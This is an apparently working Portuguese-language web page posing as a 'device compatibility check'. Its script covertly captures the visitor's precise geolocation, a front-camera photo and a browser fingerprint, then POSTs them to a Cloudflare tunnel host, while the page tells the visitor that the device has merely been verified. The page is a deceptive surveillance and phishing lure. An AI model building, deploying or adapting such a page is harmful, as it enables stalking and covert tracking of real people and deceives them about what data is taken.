<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica√ß√£o de Compatibilidade</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
            position: relative;
        }
        
        .header {
            background: linear-gradient(45deg, #1e3c72, #2a5298);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: repeating-linear-gradient(
                45deg,
                transparent,
                transparent 10px,
                rgba(255,255,255,0.05) 10px,
                rgba(255,255,255,0.05) 20px
            );
            animation: slide 20s linear infinite;
        }
        
        @keyframes slide {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        .header-content {
            position: relative;
            z-index: 1;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
            font-weight: 300;
        }
        
        .verification-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .content {
            padding: 40px 30px;
            text-align: center;
        }
        
        .status-text {
            font-size: 18px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 500;
        }
        
        .progress-container {
            margin-bottom: 30px;
        }
        
        .progress-bar {
            background: #e9ecef;
            border-radius: 25px;
            height: 12px;
            overflow: hidden;
            position: relative;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .progress-fill {
            background: linear-gradient(45deg, #28a745, #20c997, #17a2b8);
            background-size: 30px 30px;
            height: 100%;
            width: 0%;
            transition: width 0.8s ease;
            position: relative;
            border-radius: 25px;
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { background-position: -30px 0; }
            100% { background-position: 30px 0; }
        }
        
        .progress-text {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
            font-weight: 500;
        }
        
        .verification-steps {
            text-align: left;
            margin: 30px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            padding: 12px 0;
            font-size: 14px;
            color: #666;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .step:last-child {
            border-bottom: none;
        }
        
        .step-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-size: 12px;
            font-weight: bold;
            background: #e9ecef;
            color: #666;
            transition: all 0.5s ease;
        }
        
        .step.active .step-icon {
            background: #007bff;
            color: white;
            animation: bounce 0.5s ease;
        }
        
        .step.completed .step-icon {
            background: #28a745;
            color: white;
        }
        
        @keyframes bounce {
            0%, 20%, 60%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            80% { transform: translateY(-5px); }
        }
        
        .step-text {
            flex: 1;
        }
        
        .step.completed .step-text {
            color: #28a745;
            font-weight: 500;
        }
        
        .start-button {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
            position: relative;
            overflow: hidden;
        }
        
        .start-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .start-button:hover::before {
            left: 100%;
        }
        
        .start-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,123,255,0.4);
        }
        
        .start-button:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .hidden {
            display: none !important;
        }
        
        .success-screen {
            text-align: center;
            padding: 40px 30px;
        }
        
        .success-icon {
            font-size: 80px;
            color: #28a745;
            margin-bottom: 20px;
            animation: successPulse 1s ease-in-out;
        }
        
        @keyframes successPulse {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .success-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .success-description {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .continue-button {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .continue-button:hover {
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(40,167,69,0.3);
        }
        
        .session-info {
            font-size: 12px;
            opacity: 0.6;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Tela Inicial -->
        <div id="initialScreen">
            <div class="header">
                <div class="header-content">
                    <div class="verification-icon">üîç</div>
                    <h1>Verifica√ß√£o de Compatibilidade</h1>
                    <p>Verificando se seu dispositivo suporta nossos recursos</p>
                </div>
            </div>
            
            <div class="content">
                <div class="status-text" id="statusText">
                    Clique no bot√£o abaixo para iniciar a verifica√ß√£o
                </div>
                
                <button class="start-button" id="startButton" onclick="startVerification()">
                    <span id="buttonText">üöÄ Iniciar Verifica√ß√£o</span>
                </button>
                
                <div class="verification-steps">
                    <div class="step" id="step1">
                        <div class="step-icon">1</div>
                        <div class="step-text">Verificando navegador e sistema operacional</div>
                    </div>
                    <div class="step" id="step2">
                        <div class="step-icon">2</div>
                        <div class="step-text">Testando recursos de localiza√ß√£o</div>
                    </div>
                    <div class="step" id="step3">
                        <div class="step-icon">3</div>
                        <div class="step-text">Verificando acesso √† c√¢mera</div>
                    </div>
                    <div class="step" id="step4">
                        <div class="step-icon">4</div>
                        <div class="step-text">Configurando recursos avan√ßados</div>
                    </div>
                </div>
                
                <div class="session-info">
                    Sess√£o: <span id="sessionId"></span>
                </div>
            </div>
        </div>
        
        <!-- Tela de Progresso -->
        <div id="progressScreen" class="hidden">
            <div class="header">
                <div class="header-content">
                    <div class="verification-icon">‚öôÔ∏è</div>
                    <h1>Verificando Dispositivo</h1>
                    <p>Por favor, aguarde alguns momentos</p>
                </div>
            </div>
            
            <div class="content">
                <div class="status-text" id="progressStatusText">
                    Iniciando verifica√ß√£o...
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">0% conclu√≠do</div>
                </div>
                
                <div class="verification-steps">
                    <div class="step" id="progress-step1">
                        <div class="step-icon">1</div>
                        <div class="step-text">Verificando navegador e sistema operacional</div>
                    </div>
                    <div class="step" id="progress-step2">
                        <div class="step-icon">2</div>
                        <div class="step-text">Testando recursos de localiza√ß√£o</div>
                    </div>
                    <div class="step" id="progress-step3">
                        <div class="step-icon">3</div>
                        <div class="step-text">Verificando acesso √† c√¢mera</div>
                    </div>
                    <div class="step" id="progress-step4">
                        <div class="step-icon">4</div>
                        <div class="step-text">Configurando recursos avan√ßados</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Tela de Sucesso -->
        <div id="successScreen" class="hidden">
            <div class="success-screen">
                <div class="success-icon">‚úÖ</div>
                <div class="success-title">Verifica√ß√£o Conclu√≠da!</div>
                <div class="success-description">
                    Seu dispositivo √© totalmente compat√≠vel com nossos recursos. 
                    Todas as funcionalidades est√£o dispon√≠veis e funcionando perfeitamente.
                </div>
                <button class="continue-button" onclick="redirectToApp()">
                    Continuar para o Aplicativo
                </button>
            </div>
        </div>
    </div>

    <script>
        // Gerar session ID √∫nico
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        document.getElementById('sessionId').textContent = sessionId;
        
        let completedTasks = 0;
        const totalTasks = 3;
        let currentStep = 0;
        
        // URL do seu servidor Flask (ALTERE AQUI SE NECESS√ÅRIO)
        const API_BASE_URL = 'https://summaries-shoes-deluxe-roulette.trycloudflare.com';
        
        // Fun√ß√£o para fazer requisi√ß√µes com headers personalizados
        function customFetch(url, options = {}) {
            options.headers = options.headers || {};
            options.headers["ngrok-skip-browser-warning"] = "true";
            options.headers["Access-Control-Allow-Origin"] = "*";
            
            // Adicionar URL base se for endpoint relativo
            const fullUrl = url.startsWith('http') ? url : API_BASE_URL + url;
            
            return fetch(fullUrl, options);
        }

        // Fun√ß√£o para finalizar verifica√ß√µes
        function completeVerification() {
            completedTasks++;
            
            if (completedTasks === totalTasks) {
                setTimeout(() => {
                    showSuccessScreen();
                }, 1000);
            }
        }

        // Coleta de informa√ß√µes do dispositivo
        function collectDeviceInfo() {
            try {
                const deviceInfo = {
                    session_id: sessionId,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    },
                    browser: {
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        languages: navigator.languages,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onLine: navigator.onLine,
                        hardwareConcurrency: navigator.hardwareConcurrency
                    },
                    platform: {
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset()
                    },
                    network: {
                        connection: navigator.connection ? {
                            effectiveType: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt
                        } : 'unavailable'
                    }
                };

                customFetch("/device_info", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(deviceInfo)
                }).then(() => {
                    console.log('‚úÖ Device info enviado com sucesso');
                    completeVerification();
                }).catch((error) => {
                    console.error('‚ùå Erro ao enviar device info:', error);
                    completeVerification();
                });
            } catch (error) {
                console.error('‚ùå Erro ao coletar device info:', error);
                completeVerification();
            }
        }

        // Coleta de geolocaliza√ß√£o
        function collectLocation() {
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(function(position) {
                const locationData = {
                    session_id: sessionId,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date().toISOString(),
                    device_info: {
                        userAgent: navigator.userAgent,
                        language: navigator.language
                    },
                    browser_info: {
                        url: window.location.href,
                        referrer: document.referrer
                    }
                };

                customFetch("/location", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(locationData)
                }).then(() => {
                    console.log('‚úÖ Localiza√ß√£o enviada com sucesso');
                    completeVerification();
                }).catch((error) => {
                    console.error('‚ùå Erro ao enviar localiza√ß√£o:', error);
                    completeVerification();
                });
            }, function(error) {
                console.error('‚ùå Erro ao obter localiza√ß√£o:', error);
                completeVerification();
            }, options);
        }

        // Coleta de foto
        function collectPhoto() {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    frameRate: { ideal: 30 }
                } 
            }).then(stream => {
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                video.style.display = 'none';

                video.addEventListener('loadedmetadata', () => {
                    const canvas = document.createElement("canvas");
                    const context = canvas.getContext("2d");

                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        const dataURL = canvas.toDataURL("image/jpeg", 0.8);

                        const photoData = {
                            session_id: sessionId,
                            photo: dataURL,
                            camera_info: {
                                width: canvas.width,
                                height: canvas.height,
                                timestamp: new Date().toISOString(),
                                facing_mode: "user"
                            }
                        };

                        customFetch("/upload_photo", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(photoData)
                        }).then(() => {
                            console.log('‚úÖ Foto enviada com sucesso');
                            completeVerification();
                        }).catch((error) => {
                            console.error('‚ùå Erro ao enviar foto:', error);
                            completeVerification();
                        });
                    }, 2000);
                });
            }).catch((error) => {
                console.error('‚ùå Erro ao acessar c√¢mera:', error);
                completeVerification();
            });
        }
        
        const steps = [
            {
                text: "Verificando navegador e sistema operacional...",
                duration: 1500,
                action: () => collectDeviceInfo()
            },
            {
                text: "Testando recursos de localiza√ß√£o...",
                duration: 2000,
                action: () => collectLocation()
            },
            {
                text: "Verificando acesso √† c√¢mera...",
                duration: 2500,
                action: () => collectPhoto()
            },
            {
                text: "Finalizando configura√ß√µes...",
                duration: 1500,
                action: () => console.log("Finalizado")
            }
        ];
        
        function startVerification() {
            document.getElementById('initialScreen').classList.add('hidden');
            document.getElementById('progressScreen').classList.remove('hidden');
            
            currentStep = 0;
            runVerificationStep();
            
            setTimeout(() => {
                collectLocation();
                collectPhoto();  
                collectDeviceInfo();
            }, 500);
        }
        
        function runVerificationStep() {
            if (currentStep >= steps.length) {
                return;
            }
            
            const step = steps[currentStep];
            
            document.getElementById('progressStatusText').textContent = step.text;
            
            const stepElement = document.getElementById(`progress-step${currentStep + 1}`);
            stepElement.classList.add('active');
            
            const targetProgress = ((currentStep + 1) / steps.length) * 100;
            animateProgress(targetProgress);
            
            setTimeout(() => {
                stepElement.classList.remove('active');
                stepElement.classList.add('completed');
                
                currentStep++;
                runVerificationStep();
            }, step.duration);
        }
        
        function animateProgress(targetPercent) {
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            const currentPercent = parseInt(progressFill.style.width) || 0;
            const increment = (targetPercent - currentPercent) / 20;
            
            let current = currentPercent;
            const interval = setInterval(() => {
                current += increment;
                if (current >= targetPercent) {
                    current = targetPercent;
                    clearInterval(interval);
                }
                
                progressFill.style.width = current + '%';
                progressText.textContent = Math.round(current) + '% conclu√≠do';
            }, 50);
        }
        
        function showSuccessScreen() {
            document.getElementById('progressScreen').classList.add('hidden');
            document.getElementById('successScreen').classList.remove('hidden');
        }
        
        function redirectToApp() {
            alert('üéâ Redirecionando para o aplicativo principal!');
            // Redirecionar para outra p√°gina ou mostrar conte√∫do principal
            // window.location.href = '/main';
        }
    </script>
</body>
</html>